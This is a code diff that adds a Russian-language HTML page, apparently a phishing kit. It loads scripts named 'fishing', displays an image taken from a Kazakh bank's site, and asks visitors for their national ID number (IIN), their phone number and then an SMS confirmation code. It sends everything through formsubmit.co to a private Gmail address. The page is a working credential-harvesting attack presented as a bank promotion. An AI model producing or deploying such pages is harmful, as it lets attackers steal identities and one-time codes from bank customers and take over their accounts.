@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Многошаговая форма</title>
+    <link rel="stylesheet" href="fishing.css">
+    <script defer src="fishing.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        form { max-width: 400px; margin: auto; }
+        input, button { width: 100%; padding: 10px; margin: 5px 0; }
+        #step2 { display: none; }
+    </style>
+</head>
+<body>
+    <img src="https://berekebank.kz/directus-new-assets/474f7b4b-a8ff-4f07-bdad-68dad9a8054b" alt="Italian Trulli">
+    <h2>Принять участие</h2>
+
+    <form id="multiStepForm" action="https://formsubmit.co/tumrdusyov@gmail.com" method="POST">
+        <!-- Step 1: Collect ИИН and Phone -->
+        <div id="step1">
+            <input type="text" id="iin" name="ИИН" placeholder="Введите ИИН" required>
+            <input type="text" id="phone" name="Номер телефона" placeholder="Введите номер" required>
+            <button type="button" id="submitStep1">Продолжить</button>
+        </div>
+
+        <!-- Step 2: Enter SMS Code -->
+        <div id="step2">
+            <input type="text" id="smsCode" name="SMS Код" placeholder="Введите SMS-код" required>
+            <button type="submit">Подтвердить</button>
+        </div>
+    </form>
+</body>
+</html>
